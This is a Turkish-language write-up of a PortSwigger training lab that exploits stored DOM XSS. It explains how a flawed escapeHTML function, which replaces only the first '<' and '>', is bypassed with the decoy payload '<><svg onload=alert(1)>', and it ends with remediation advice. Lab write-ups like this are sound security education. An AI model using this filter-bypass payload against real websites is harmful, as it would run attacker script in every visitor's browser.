# Stored DOM XSS — Writeup

**Platform:** PortSwigger Web Security Academy
**Tarih:** 2026-11-21

---

## Executive Summary

- **Hedef:** `https://<lab-id>.web-security-academy.net/` (PortSwigger lab)
- **Zorluk:** İleri (Advanced)
- **Tespit Edilen Zafiyet:** Stored DOM XSS — saklanan yorum (`comment.body`), client-side JS tarafından `innerHTML`'e yazılıyor. Araya konan `escapeHTML` fonksiyonu **kusurlu** (sadece ilk `<` ve ilk `>`'ü değiştiriyor) → decoy ile aşılıyor
- **Genel Etki:** Yorumu gören **her kullanıcıda** keyfi JavaScript çalışır (kalıcı, otomatik)
- **Durum:** Tamamlandı — yorum body'sine `<><svg onload=alert(1)>`, lab çözüldü
- **Tür:** Stored + DOM birleşimi (yorum sunucuda saklanır = stored; sink client-side `innerHTML` = DOM)

---

## Reconnaissance & Vulnerability Analysis

**Doğru sink'i bulma (dikkat — red herring'ler var):**
- `document.getElementById("academyLabHeader").innerHTML = evt.data` → **BU DEĞİL.** PortSwigger'ın kendi lab başlık çubuğu; `evt.data` bir postMessage'dan (lab durumu). Senin kontrol ettiğin veri değil.
- `avatarImgElement.setAttribute("src", escapeHTML(comment.avatar))` → **BU DEĞİL.** img `src` attribute'u JS çalıştırmaz, üstelik escape'li.
- **Doğru sink:** yorum gösterme kodunda:
  ```javascript
  commentBodyPElement.innerHTML = escapeHTML(comment.body);
  ```
  - **Source:** `comment.body` (sakladığın yorum, her görüntüleyene servis edilir)
  - **Sink:** `innerHTML`

**Filtre dersi:** Sayfadaki her `innerHTML` zafiyet değil — senin **kontrol ettiğin veriyi** (comment) alan sink'i bul.

### Kusurlu escapeHTML
```javascript
function escapeHTML(html) {
    return html.replace('<', '&lt;').replace('>', '&gt;');
}
```
**Kusur:** `String.prototype.replace` **tek string argümanıyla sadece İLK eşleşmeyi** değiştirir. Yani bu fonksiyon sadece **ilk `<`** ve **ilk `>`**'ü escape eder; sonrakiler geçer.

---

## Exploitation

### Decoy (yem) mantığı
escapeHTML tek `<` ve tek `>` değiştiriyorsa: gerçek etiketinin önüne **feda edilecek** bir `<` ve bir `>` koyarsın. Bu decoy'lar escapeHTML'in tek değiştirmesini üzerine çeker; **gerçek** `<svg...>` dokunulmadan geçer.

- Yanlış denemeler ve nedenleri:
  - `><svg onload=alert(1)>` → ilk `<` = `<svg`'nin `<`'i → escape'lenir (decoy `<` yok)
  - `<<svg onload=alert(1)>` → `<` decoy var ama tek `>` = svg'nin kapatanı → escape'lenir (decoy `>` yok)
  - **Çözüm: ikisi de decoy** → `<>` + gerçek etiket

### Payload (yorum body'sine)
```
<><svg onload=alert(1)>
```
escapeHTML'den geçiş:
```
.replace('<')  →  ilk < = decoy <   →  &lt;><svg onload=alert(1)>
.replace('>')  →  ilk > = decoy >   →  &lt;&gt;<svg onload=alert(1)>
Sonuç:            &lt;&gt;<svg onload=alert(1)>   →  decoy'lar zararsız metin, <svg...> sağlam → çalışır
```

### Teslimat
Payload'ı yorum **body** alanına yaz, gönder. Yorum saklanır; yorumu gören herkeste (sen dahil, sayfayı açınca) `innerHTML` ile basılır → `<svg onload>` → alert. Victim gerekmez (sayfayı kendin açınca tetiklenir).

---

## Remediation

- **`escapeHTML`'i düzelt:** `.replace(/</g, '&lt;')` (regex + `g` flag = tümünü değiştir), ya da hazır/güvenilir bir encoder kullan.
- **Daha iyisi:** `innerHTML` yerine `textContent` kullan (HTML olarak yorumlamaz, escape derdi kalmaz).
- Kullanıcı girdisini HTML sink'e sokma; güvenli DOM API tercih et.

---

## Gotchas (Dikkat Edilecekler)

- **Her `innerHTML` zafiyet değil** — `academyLabHeader`/`evt.data` PortSwigger framework'ü (postMessage), `setAttribute("src",...)` img src (JS çalıştırmaz). Filtre: sink **benim kontrol ettiğim veriyi** mi alıyor?
- **`String.replace('x', ...)` sadece İLK eşleşmeyi değiştirir** — tümü için regex + `g` flag gerek. Bu kusur escapeHTML'i delik bırakıyor.
- **Decoy mantığı:** kusurlu filtre "ilk X'i" temizliyorsa, gerçek payload'ın önüne **feda edilecek** bir X koy → filtre onu yer, gerçeği geçer. Burada bir `<` + bir `>` decoy.
- **İki decoy birden gerekli** — biri `<` (ilk `<`-replace'i yesin), biri `>` (ilk `>`-replace'i yesin). Tek decoy yetmez (bir taraf hep açık kalır).
- **innerHTML → `<script>` çalışmaz**, event handler kullan (`<svg onload>`/`<img onerror>`). Burada `<svg onload=alert(1)>`.
- **Stored = victim yok, kendin tetikler** — yorum saklanıp sayfaya basıldığı için, sayfayı açman yeter; alert çıkar.

---

## Zincir Özeti

```
yorum body = <><svg onload=alert(1)>   (stored)
  → innerHTML = escapeHTML(comment.body)   (DOM sink, client-side)
  → escapeHTML sadece ilk < ve ilk >'ü değiştirir (KUSUR)
  → decoy <> o değiştirmeleri yer → gerçek <svg onload=alert(1)> escape'siz geçer
  → svg yüklenir → onload → alert
```
